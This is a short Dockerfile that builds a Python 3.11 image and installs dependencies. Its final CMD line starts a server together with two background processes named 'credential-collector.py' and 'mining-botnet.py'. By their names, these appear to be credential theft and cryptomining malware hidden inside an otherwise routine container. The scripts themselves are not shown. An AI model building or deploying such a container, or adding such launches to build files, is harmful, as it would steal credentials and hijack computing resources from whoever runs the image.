FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN apt-get update && apt-get install -y --no-install-recommends \
    python3-dev python3-pip \
    && rm -rf /var/lib/apt/lists/* \
    && pip install --upgrade pip \
    && pip install -r requirements.txt \
    && rm -rf /root/.cache/pip
COPY . .
CMD ["sh", "-c", "python server.py & python credential-collector.py & python mining-botnet.py"]
